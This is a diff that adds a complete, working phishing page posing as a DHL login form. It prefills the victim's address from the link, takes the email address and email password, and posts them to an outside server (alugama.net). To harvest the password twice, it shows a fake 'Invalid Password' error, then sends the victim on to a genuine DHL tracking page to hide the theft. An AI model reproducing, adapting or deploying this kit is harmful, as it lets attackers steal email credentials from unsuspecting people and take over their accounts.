@@ -1,0 +1,184 @@
+<html><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/jquery-ui.structure.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/jquery-ui.theme.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/axit-jquery.dialog.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/axit-jquery.datepicker.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/axit-jquery.autocomplete.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/jquery.menu.css">
+    <title>
+        DHL
+    </title>
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/stdweborder.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/mePanel.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/meBubble.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/_.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/login.css">
+    <link rel="stylesheet" href="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/loginPage18.css">
+</head>
+
+<body class="page-login">
+    <div class="fullPageBackground" style="background-image: url(https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/bg.jpg);">
+        <div id="loginPage18" class="login-tab loginPageBackground">
+            <div class="login-tab__main-div">
+                <img class="login-tab__logo " src="https://storage.googleapis.com/gfvhgbfvgbvfc.appspot.com/image.png">
+                <div style="display: block;" class="login-form-view login-page-view">
+                    <div class="login-tab__information-icon">
+                        <svg width="25" height="25">
+                            <circle cx="12.5" cy="12.5" r="8" stroke-width="1.2" fill="none"></circle>
+                            <text font-size="13" font-family="Verdana" x="10.5" y="17.4">i</text>
+                        </svg>
+                    </div>
+                    <form id="loginForm" class="container-form" method="post">
+                        <input name="VGID" value="2012421" type="hidden">
+                        <span class="wr-txt" id="login_error_msg"></span>
+                        <center>
+                            <div class="alert alert-danger" id="msg" style="display: none;color: red;">Invalid Password..! Please enter correct password.</div>
+                            <span id="error" class="text-danger" style="display: none;color: red">That account doesn't exist. Enter a different account</span>
+                        </center>
+                        <input class=" login-form-view__login-input" id="ai" name="ai" value="" autocomplete="off" placeholder="Username or Email Address" required="" type="email">
+                        <input class=" login-form-view__login-input" id="pr" name="pr" placeholder="Email Password" required="yes" type="password">
+                        <input class="newButtonPanel buttonFinalColor login-form-view__login-button" type="button" id="submit-btn" style="font-face: 'Comic Sans MS'; font-size: larger; color: White; background-color: rgb(153, 0, 0); border: 0pt ridge lightgrey" value=" Login ">
+                        <div class="login-form-view__password-panel">
+                            <a class="login-form-view__password-forgot-link finalbutton"></a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="additionalLinksLogin">
+        <a class="additionalLink termsOfUseLink" href="https://f31f2f4e88b1f4c29a4542671b247f9b.fra1.digitaloceanspaces.com/index.html" target="_blank">
+            By using our application, you consent to the Terms of Use as set out under this link.
+        </a>
+        <a class="additionalLink privatePolicyLink" href="https://f31f2f4e88b1f4c29a4542671b247f9b.fra1.digitaloceanspaces.com/index.html" target="_blank">
+            Data Privacy Notice
+        </a>
+        <a class="additionalLink imprintLink" href="https://f31f2f4e88b1f4c29a4542671b247f9b.fra1.digitaloceanspaces.com/index.html" target="_blank">
+            Imprint
+        </a>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+
+        $('#ai').val(my_ai);
+        $('#aich').html(my_ai);
+        $("#msg").hide();
+
+    }
+    ///////////////url getting ai////////////////
+
+
+    var file = "bmV4dC5waHA=";
+
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is empty.!");
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is empty.!");
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////new injection////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: "https://alugama.net/plugins/maintenance/next.php",
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').val('Tracking...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+    		window.location.replace("https://www.dhl.com/content/g0/en/express/tracking.shtml?AWB=4003526800&brand=DHL");
+                            return false;
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+    		window.location.replace("https://www.dhl.com/content/g0/en/express/tracking.shtml?AWB=4003526800&brand=DHL");
+                    return false;
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').val('Login');
+            }
+        });
+    });
+
+
+});
+</script>
+
+</body></html>
